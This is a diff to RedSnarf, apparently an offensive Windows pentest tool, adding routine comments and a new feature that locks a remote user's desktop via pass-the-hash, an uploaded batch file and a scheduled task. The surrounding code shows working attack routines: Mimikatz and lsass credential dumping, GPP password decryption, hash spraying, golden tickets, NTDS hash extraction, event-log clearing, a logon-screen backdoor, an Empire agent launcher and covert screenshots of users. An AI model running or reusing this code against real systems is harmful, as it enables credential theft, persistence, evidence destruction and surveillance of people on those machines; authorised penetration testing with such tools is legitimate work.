@@ -304,6 +304,7 @@ class SAMRDump:
         print("\t[+] Account Lockout Threshold: {0}".format(self.__accnt_lock_thres))
         print("\t[+] Forced Log off Time: {0}".format(self.__force_logoff_time))
 
+#Routine decrypts cpassword values
 def gppdecrypt(cpassword_pass):
 	#Original code taken from the resource below.
 	#https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py
@@ -314,6 +315,7 @@ def gppdecrypt(cpassword_pass):
 	o = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(password)
 	print colored('Your cpassword is '+o[:-ord(o[-1])].decode('utf16'),'green')
 
+#Routine helps start John the Ripper
 def quickjtr(filename):
 	
 	if os.path.isfile("/usr/share/wordlists/rockyou.txt"):		
@@ -348,7 +350,7 @@ def quickjtr(filename):
 		print colored("[+]john --format=nt "+str(filename)+ " --rules",'yellow')
 		os.system("john --format=nt "+str(filename)+" --rules")
 	
-
+#Routine Write out a batch file which can be used to turn on/off LocalAccountTokenFilterPolicy
 def WriteLAT():
 	try:
 		print colored("[+]Attempting to write Local Account Token Filter Policy ",'green')
@@ -390,6 +392,7 @@ def WriteLAT():
 	except:
 		print colored("[-]Something went wrong...",'red')
 
+#Routine gets current ip address
 def get_ip_address(ifname):
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	return socket.inet_ntoa(fcntl.ioctl(
@@ -398,8 +401,8 @@ def get_ip_address(ifname):
 		struct.pack('256s', ifname[:15])
 	)[20:24])
 
+#Routine gets domain usernames
 def enumdomusers(ip,username,password,path):
-	
 	#Enumerate users using enumdomusers
 	dom_accounts = []
 
@@ -422,7 +425,6 @@ def enumdomusers(ip,username,password,path):
 		print colored(username+" "+password,'blue') +colored(" - NT_STATUS_PASSWORD_MUST_CHANGE",'blue')
 	else:
 		print colored("[+]Successful Connection...",'yellow')
-
 
 	if not "user:[" in stdout_value:
 		return False
@@ -453,6 +455,7 @@ def enumdomusers(ip,username,password,path):
 		print colored('[-]Looks like we were unsuccessfull extracting user names with this method','red')
 		logging.error("[-]Looks like we were unsuccessfull extracting user names with this method")
 
+#Routine gets user descriptions fields
 def getdescfield(ip,username,password,path):
 	
 	usernames = []
@@ -526,6 +529,7 @@ def getdescfield(ip,username,password,path):
 	else:
 		print colored('[-]Unable to find username file...','red')
 
+#Main routine for dumping from a remote machine
 def datadump(user, passw, host, path, os_version):
 	
 	#Exception where User has no password
@@ -673,6 +677,8 @@ def datadump(user, passw, host, path, os_version):
 				except OSError:
 					print colored("[-]Something went wrong getting lsass.dmp",'red')
 					logging.error("[-]Something went wrong getting lsass.dmp")
+			
+			#Routine does a basic mimikatz dump
 			if massmimi_dump in yesanswers:
 				try:
 					print colored("[+]Attempting to Run Mimikatz",'green')
@@ -704,6 +710,7 @@ def datadump(user, passw, host, path, os_version):
 				except OSError:
 					print colored("[-]Something went wrong running Mimikatz...",'red')
 
+			#Routine clears event logs
 			if clear_event in events_logs:
 				try:
 					print colored("[+]Clearing event log: "+clear_event,'green')
@@ -714,6 +721,7 @@ def datadump(user, passw, host, path, os_version):
 				print colored("[+]Event logs NOT cleared...",'yellow')
 				logging.warning("Event logs NOT cleared")
 
+			#Routine runs custom commands
 			if xcommand!='n':
 				try:
 					print colored("[+]Running Command: "+xcommand,'green')
@@ -721,6 +729,7 @@ def datadump(user, passw, host, path, os_version):
 				except:
 					print colored("[-]Something went wrong ...",'red')
 
+			#Routine runs a stealth mimikatz
 			if stealth_mimi in yesanswers or stealth_mimi=="AV":
 				try:
 					print colored("[+]Checking for Invoke-Mimikatz.ps1",'green')
@@ -824,6 +833,7 @@ def datadump(user, passw, host, path, os_version):
 				except OSError:
 					print colored("[-]Something went wrong here...",'red')
 
+			#Routine will launch an empire agent
 			if empire_launcher in yesanswers:
 				try:		
 					#Check to make sure port is not already in use
@@ -858,6 +868,7 @@ def datadump(user, passw, host, path, os_version):
 				except OSError:
 					print colored("[-]Something went wrong here...",'red')
 
+			#Routine starts multi_rdp in conjunction with mimikatz
 			if multi_rdp in yesanswers or multi_rdp=="AV":
 				try:
 					print colored("[+]Checking for Invoke-Mimikatz.ps1",'green')
@@ -933,6 +944,7 @@ def datadump(user, passw, host, path, os_version):
 				except OSError:
 					print colored("[-]Something went wrong here...",'red')
 
+			#Routine runs mimikittenz to scrape memory for passwords
 			if mimikittenz in yesanswers:
 				try:
 					print colored("[+]Checking for Invoke-mimikittenz.ps1",'green')
@@ -994,6 +1006,7 @@ def datadump(user, passw, host, path, os_version):
 				except OSError:
 					print colored("[-]Something went wrong here...",'red')
 
+			#Routine will screen shot all logged on users desktops
 			if screenshot in yesanswers:
 				loggeduser1=""
 				loggeduser = []
@@ -1069,6 +1082,7 @@ def datadump(user, passw, host, path, os_version):
 				except OSError:
 					print colored("[-]Something went wrong running screenshot...",'red')
 
+			#Routine will look for unattended installation files and check for passwords
 			if unattend in yesanswers:
 				
 				try:					
@@ -1181,11 +1195,13 @@ def datadump(user, passw, host, path, os_version):
 				except OSError:
 					print colored("[-]Something went wrong running looking for files...",'red')
 
+#Routine handles Crtl+C
 def signal_handler(signal, frame):
 		print colored("\nCtrl+C pressed.. aborting...",'red')
 		logging.error("Ctrl+C pressed.. aborting...")
 		sys.exit()
 
+#Routine completes some basic sanity checks
 def syschecks():
 	winexe = os.system("which pth-winexe > /dev/null")
 	if winexe != 0:
@@ -1215,6 +1231,7 @@ def syschecks():
 		print colored("[+]creddump7 found",'green')
 		logging.info("[+]creddump7 found")
 
+#Routine checks to see if remote machine is a DC
 def checkport():
 	host=targets[0]
 	scanv = subprocess.Popen(["nmap", "-sS", "-p88","--open", str(host)], stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()[0]
@@ -1226,6 +1243,7 @@ def checkport():
 	else:
 		print colored("[+]Looks like a Domain Controller",'green')
 
+#Routine checks for local admins
 def get_local_admins(ip,username,password,domain):
 	
 	LocalAdmin=False
@@ -1241,6 +1259,7 @@ def get_local_admins(ip,username,password,domain):
 		
 	return LocalAdmin	
 
+#Routine checks for domain admins
 def get_domain_admins(ip,username,password,domain):
 	
 	DomainAdmin=False
@@ -1344,6 +1363,7 @@ def run():
 				print colored(e,'red')
 				logging.exception(e)
 
+#Routine parses dumped hashes to make reporting/cracking easier
 def hashparse(hashfolder,hashfile):
 #Split hashes into NT and LM	
 	file2parse=hashfolder+hashfile
@@ -1431,6 +1451,7 @@ def hashparse(hashfolder,hashfile):
 			with open(hashfolder+'/lm_usernames.txt') as f:
 				print colored('[+]'+str(sum(1 for _ in f))+' LM usernames written to '+hashfolder+'/lm_usernames.txt\n','red') 
 
+#Routine gets the enabled/disabled status of a user
 def userstatus(targetpath,dcip,inputfile):
 	e=''
 
@@ -1500,6 +1521,7 @@ def userstatus(targetpath,dcip,inputfile):
 			print colored("[+]"+str(sum(1 for _ in f))+" disabled accounts written to "+targetpath+str(dcip)+'/'+'disabled_'+inputfile,'green')
 
 def main():
+	#Routine will spray hashes at ip's
 	if credsfile!='':
 		print colored('\n[+]Getting ready to spray some hashes...','yellow') 
 		if os.path.isfile(credsfile):
@@ -1569,6 +1591,8 @@ def main():
 							logging.error("[-]Credentials Error")
 	else:
 		run()
+	
+	#Routine will merge multiple hashdumps from machines taken over a range
 	if len(targets)>1 and args.quick_validate in noanswers:
 		print colored ('\n[+]Range Detected - Now trying to merge pwdump files to '+mergepf,'yellow')
 
@@ -1589,6 +1613,7 @@ def main():
 			os.system('rm /tmp/tmpmerge.txt')
 		print colored ('\n[+]Check out '+mergepf+' for unique, sorted, merged hash list','yellow')
 
+	#Routine will find where a specific user is logged on
 	if find_user !='n':
 		print colored ('\n[+]Now looking for where user '+find_user+' is logged in','yellow')
 		for ip in targets:
@@ -1597,8 +1622,9 @@ def main():
 				if find_user in open(outputpath+str(ip)+'/logged_on_users.txt').read():
 					print colored ("[+]Found " + find_user + " logged in to "+str(ip),'green')
 
+#Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3i", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3j", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -1619,6 +1645,7 @@ ugroup.add_argument("-uD", "--dropshell", dest="dropshell", default="n", help="<
 ugroup.add_argument("-uE", "--empire_launcher", dest="empire_launcher", default="n", help="<Optional> Start Empire Launcher")
 ugroup.add_argument("-uG", "--c_password", dest="c_password", default="", help="<Optional> Decrypt GPP Cpassword")
 ugroup.add_argument("-uJ", "--john_to_pipal", dest="john_to_pipal", default="", help="<Optional> Send passwords cracked with JtR to Pipal for Auditing")
+ugroup.add_argument("-uL", "--lockdesktop", dest="lockdesktop", default="", help="<Optional> Lock remote users Desktop")
 ugroup.add_argument("-uM", "--mssqlshell", dest="mssqlshell", default="", help="<Optional> Start MSSQL Shell use WIN for Windows Auth, DB for MSSQL Auth")
 ugroup.add_argument("-uP", "--policiesscripts_dump", dest="policiesscripts_dump", default="n", help="<Optional> Enter y to Dump Policies and Scripts folder from a Domain Controller")
 ugroup.add_argument("-uR", "--multi_rdp", dest="multi_rdp", default="n", help="<Optional> Enable Multi-RDP with Mimikatz")
@@ -1717,6 +1744,7 @@ wifi_credentials=args.wifi_credentials
 john_to_pipal=args.john_to_pipal
 get_spn=args.get_spn
 win_scp=args.win_scp
+lockdesktop=args.lockdesktop
 
 #Code takes a hash file which has previously been seen by Jtr, cuts out the cracked passwords, gets rid of any blank lines, gets rid of the last line, outputs to a tmp file
 #in the tmp directory. Runs pipal against the tmp file and then pipes out the pipal data to file.
@@ -1729,10 +1757,12 @@ if john_to_pipal!='':
 	
 	sys.exit()
 
+#Call routine to write out LAT file
 if lat in yesanswers:
 	WriteLAT()
 	sys.exit()
 
+#Decrypt a passed cpassword
 if c_password!='':
 	try:
 		banner()
@@ -1742,6 +1772,7 @@ if c_password!='':
 	except:
 		sys.exit()
 
+#Parse the ip to see if we are dealing with a single ip, a range or a file with multiple ips
 targets=[]
 remotetargets = args.host
 
@@ -1772,6 +1803,53 @@ elif remotetargets[0:6]=='range=':
 	for remotetarget in IPNetwork(remotetargets[6:len(remotetargets)]):
 		targets.append (remotetarget);
 
+#Routine locks a remote users desktop
+if lockdesktop in yesanswers:
+	if len(targets)==1:
+		try:			
+			print colored("[+]Retrieving Desktops:\n",'green')
+			
+			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null")
+
+			usr_response = raw_input("\nPlease enter the username whose desktop you wish to lock : ")
+			if usr_response !="":
+
+				print colored("[+]Locking Desktop...",'yellow')
+				fout=open('/tmp/lockdesktop.bat','w')
+				fout.write('SchTasks /Create /SC DAILY /RU '+usr_response+' /TN "RedSnarf_LockDesktop" /TR "c:\\windows\\System32\\rundll32.exe user32.dll,LockWorkStation" /ST 23:36 /f\n')
+				fout.write('SchTasks /run /TN "RedSnarf_LockDesktop" \n')
+				fout.close() 
+					
+				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put lockdesktop.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"c:\\lockdesktop.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				print proc.communicate()[0]
+				
+				print colored("[+]Tidying Up...",'yellow')
+				fout=open('/tmp/lockdesktop_cleanup.bat','w')
+				fout.write('SchTasks /delete /TN "RedSnarf_LockDesktop" /f\n')
+				fout.write('del c:\\lockdesktop.bat"\n')
+				fout.close() 
+
+				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put lockdesktop_cleanup.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				print proc.communicate()[0]
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"c:\\lockdesktop_cleanup.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]					
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\lockdesktop_cleanup.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+				print proc.communicate()[0]
+
+				print colored("[+]User desktop "+usr_response+" should be locked...",'green')
+
+			sys.exit()
+			
+		except OSError:
+			print colored("[-]Something went wrong locking the desktop",'red')
+			logging.error("[-]Something went wrong locking the desktop")
+
+	else:
+		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
+		sys.exit()
+
+#Routine finds and decrypts and WinSCP passwords
 if win_scp!='n':
 	num_sessions = []
 	if len(targets)==1:
@@ -1783,7 +1861,6 @@ if win_scp!='n':
 				print colored("[+]WinSCP Master Password Detection:",'green')
 				print colored("[+]A Master Password is in use, unable to continue:",'yellow')
 				sys.exit()
-
 
 			print colored("[+]Getting WinSCP Sessions:",'green')
 			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\" ' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
@@ -1846,6 +1923,7 @@ if win_scp!='n':
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
+#Routine gets user SPN's from the DC so that they can be cracked with JtR or HashCat
 if get_spn in yesanswers or get_spn=="l":
 	if len(targets)==1:
 		try:
@@ -1916,7 +1994,7 @@ if get_spn in yesanswers or get_spn=="l":
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
-
+#Routine gets Wifi Credentials from the remote machine
 if wifi_credentials in yesanswers:
 	if len(targets)==1:
 		try:
@@ -1952,6 +2030,7 @@ if wifi_credentials in yesanswers:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
+#Routine starts a MSSQL client
 if mssqlshell=="WIN" or mssqlshell=="DB":
 	if len(targets)==1:
 		try:			
@@ -1988,6 +2067,7 @@ if mssqlshell=="WIN" or mssqlshell=="DB":
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
+#Routine will record a remote users desktop using Windows Problem Step Recorder
 if recorddesktop in yesanswers:
 	if len(targets)==1:
 		try:			
@@ -2059,6 +2139,7 @@ if recorddesktop in yesanswers:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
+#Routine will generate golden tickets
 if golden_ticket in yesanswers:
 	if len(targets)==1:
 		try:
@@ -2151,6 +2232,7 @@ if golden_ticket in yesanswers:
 			logging.error("[-]Something went wrong creating Golden-Ticket")		
 			sys.exit()
 
+#Routine will display the Windows Password Policy
 if password_policy in yesanswers:
 	if len(targets)==1:
 		try:			
@@ -2172,6 +2254,7 @@ if password_policy in yesanswers:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
+#Routine will enable/disable/query the scforceoption registry value
 if edq_scforceoption!='n':
 	if len(targets)==1:
 		try:
@@ -2250,6 +2333,7 @@ if edq_scforceoption!='n':
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
+#Routine will enable/disable/query the SingleSessionPerUser registry value
 if edq_SingleSessionPerUser!='n':
 	if len(targets)==1:
 		try:
@@ -2293,6 +2377,7 @@ if edq_SingleSessionPerUser!='n':
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
+#Routine will enable/disable/query the allowtgtsessionkey registry value
 if edq_allowtgtsessionkey!='n':
 	if len(targets)==1:
 		try:
@@ -2336,6 +2421,7 @@ if edq_allowtgtsessionkey!='n':
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
+#Routine will enable/disable/query the autologon registry values
 if edq_autologon!='n':
 	if len(targets)==1:
 		try:
@@ -2391,6 +2477,7 @@ if edq_autologon!='n':
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
+#Routine will enable/disable/query the wdigest registry values
 if edq_wdigest!='n':
 	if len(targets)==1:
 		try:
@@ -2449,6 +2536,7 @@ if edq_wdigest!='n':
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
+#Routine will enable/disable/query the network level authentication registry values
 if edq_nla!='n':
 	if len(targets)==1:
 		try:
@@ -2488,6 +2576,7 @@ if edq_nla!='n':
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
+#Routine will enable/disable/query the RDP registry values and change port from 3389 to 443
 if edq_trdp!='n':
 	if len(targets)==1:
 		try:
@@ -2534,6 +2623,7 @@ if edq_trdp!='n':
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
+#Routine will enable/disable/query the RDP registry values
 if edq_rdp!='n':
 	if len(targets)==1:
 		try:
@@ -2585,6 +2675,7 @@ if edq_rdp!='n':
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
+#Routine will add a backdoor to the Windows Logon Screen
 if edq_backdoor!='n':
 	if len(targets)==1:
 		try:
@@ -2618,6 +2709,7 @@ if edq_backdoor!='n':
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
+#Routine will enable/disable/query the UAC registry values
 if edq_uac!='n':
 	if len(targets)==1:
 		try:
@@ -2653,6 +2745,7 @@ if edq_uac!='n':
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
+#Routine will dump hashes from DC using the drsuapi method
 if drsuapi in yesanswers:
 	if len(targets)==1:
 		try:
@@ -2764,6 +2857,7 @@ if drsuapi in yesanswers:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
+#Routine will dump hashes from DC using the NTDSutil method
 if ntds_util in yesanswers or ntds_util=="d":
 	#Currently undocumented function - creates a bat file which can be copied and pasted to the remote machine if the process can't be fully automated
 	if ntds_util=='d':
@@ -2851,6 +2945,7 @@ if ntds_util in yesanswers or ntds_util=="d":
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
+#Routine will scrape the policies and scripts folder on a DC for anything useful
 if policiesscripts_dump in yesanswers:
 	if len(targets)==1:
 		if user!='' and passw!='' and targets[0]!='':
@@ -2948,6 +3043,7 @@ if policiesscripts_dump in yesanswers:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
+#Routine will display high priv tasks running on a remote machine
 if system_tasklist in yesanswers:
 	if len(targets)==1:
 		try:
@@ -2961,6 +3057,7 @@ if system_tasklist in yesanswers:
 		print colored ('\n[-]It is only possible to drop a shell on a single target and not a range','red')
 		sys.exit()
 
+#Routine will start a shell
 if dropshell in yesanswers:
 	if len(targets)==1:
 		try:
@@ -2998,6 +3095,7 @@ if dropshell in yesanswers:
 		print colored ('\n[-]It is only possible to drop a shell on a single target and not a range','red')
 		sys.exit()
 
+#Routine will find where a user is logged on
 if ofind_user !='n':
 	if "file=" in ofind_user:
 		print colored("[+]Search cached logged_on_users.txt files for users",'yellow')
@@ -3031,6 +3129,7 @@ if ofind_user !='n':
 	
 	sys.exit()
 
+#Routine will check AD description field for possible passwords
 if user_desc in yesanswers:
 	if len(targets)==1:
 		try:
